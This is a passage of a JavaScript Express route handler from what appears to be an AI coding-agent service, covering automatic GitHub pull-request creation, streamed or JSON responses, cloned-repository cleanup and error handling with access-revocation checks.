          const prTitle = commitMessages.length > 0 ? commitMessages[0] : message;

          // Generate PR body from commit messages
          let prBody = '## Changes\n\n';
          if (commitMessages.length > 0) {
            prBody += commitMessages.map(msg => `- ${msg}`).join('\n');
          } else {
            prBody += `Agent task: ${message}`;
          }
          prBody += '\n\n---\n*This pull request was automatically created by Nassaj.*';

          console.log(`📝 PR Title: ${prTitle}`);

          // Create the pull request
          console.log('🔄 Creating pull request...');
          assertAgentAccessCurrent(req, workspaceFence, false);
          prInfo = await createGitHubPR(octokit, owner, repo, finalBranchName, prTitle, prBody, 'main');
          assertAgentAccessCurrent(req, workspaceFence, false);
        }

        // Send branch/PR info in response
        if (stream) {
          if (branchInfo) {
            writer.send({
              type: 'github-branch',
              branch: branchInfo
            });
          }
          if (prInfo) {
            writer.send({
              type: 'github-pr',
              pullRequest: prInfo
            });
          }
        }

      } catch (error) {
        console.error('❌ GitHub branch/PR creation error:', error);

        // Send error but don't fail the entire request
        if (stream) {
          writer.send({
            type: 'github-error',
            error: error.message
          });
        }
        // Store error info for non-streaming response
        if (!stream) {
          branchInfo = { error: error.message };
          prInfo = { error: error.message };
        }
      }
    }

    // Handle response based on streaming mode. Mark completion FIRST so the
    // 'close' Node emits after res.end() is not mistaken for a disconnect.
    requestCompleted = true;
    assertAgentAccessCurrent(req, workspaceFence, false);
    if (stream) {
      // Streaming mode: end the SSE stream
      writer.end();
    } else {
      // Non-streaming mode: send filtered messages and token summary as JSON
      const assistantMessages = writer.getAssistantMessages();
      const tokenSummary = writer.getTotalTokens();

      const response = {
        success: true,
        sessionId: writer.getSessionId(),
        messages: assistantMessages,
        tokens: tokenSummary,
        projectPath: finalProjectPath
      };

      // Add branch/PR info if created
      if (branchInfo) {
        response.branch = branchInfo;
      }
      if (prInfo) {
        response.pullRequest = prInfo;
      }

      res.json(response);
    }

    // Clean up if requested
    if (cloneCreationReceipt) {
      if (cleanup) {
        const sessionIdForCleanup = writer.getSessionId();
        setTimeout(() => {
          void applyCloneRetentionPolicy(cloneCreationReceipt, {
            cleanup: true, sessionId: sessionIdForCleanup,
          }).catch((cleanupError) => reportScheduledCloneCleanupFailure(cleanupError));
        }, 5000);
      } else {
        await applyCloneRetentionPolicy(cloneCreationReceipt, { cleanup: false });
      }
    }

  } catch (error) {
    console.error('❌ External session error:', error);
    // The request is terminating here; suppress the disconnect path.
    requestCompleted = true;

    if (error instanceof AgentAccessFenceError) {
      if (cloneCreationReceipt) {
        const sessionIdForCleanup = writer ? writer.getSessionId() : null;
        try {
          await applyCloneRetentionPolicy(cloneCreationReceipt, {
            cleanup, sessionId: sessionIdForCleanup,
          });
        } catch (cleanupError) {
          if (!res.headersSent) {
            return res.status(500).json({
              error: 'Created repository cleanup failed',
              code: cleanupError?.code ?? 'CLONE_CLEANUP_FAILED',
              notStarted: false,
              effectState: 'outcome_unknown',
            });
          }
          console.error('[agent] created repository cleanup failed after access revocation:', cleanupError?.code);
        }
      }
      if (writer?.isSSEStreamWriter) writer.revokeAccess(error.code);
      if (!res.headersSent) return sendAgentFenceError(res, error);
      return;
    }

    // Clean up on error
    if (cloneCreationReceipt) {
      const sessionIdForCleanup = writer ? writer.getSessionId() : null;
      try {
        await applyCloneRetentionPolicy(cloneCreationReceipt, {
          cleanup, sessionId: sessionIdForCleanup,
        });
      } catch (cleanupError) {
        console.error('[agent] created repository cleanup failed after run failure:', cleanupError?.code);
        if (!res.headersSent) {
          return res.status(500).json({
            error: 'Created repository cleanup failed',
            code: cleanupError?.code ?? 'CLONE_CLEANUP_FAILED',
          });
        }
      }
    }

    if (stream) {
      // For streaming, send error event and stop
      if (!writer) {
        // Set up SSE headers if not already done
        res.setHeader('Content-Type', 'text/event-stream');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');
        res.setHeader('X-Accel-Buffering', 'no');
        writer = new SSEStreamWriter(res, req.user.id, req.user);
      }

      if (!res.writableEnded) {
        writer.send({
          type: 'error',
          error: error.message,
          message: `Failed: ${error.message}`
        });
        writer.end();
      }
    } else if (!res.headersSent) {
      res.status(500).json({
        success: false,
        error: error.message
      });
    }
  }
});

export default router;
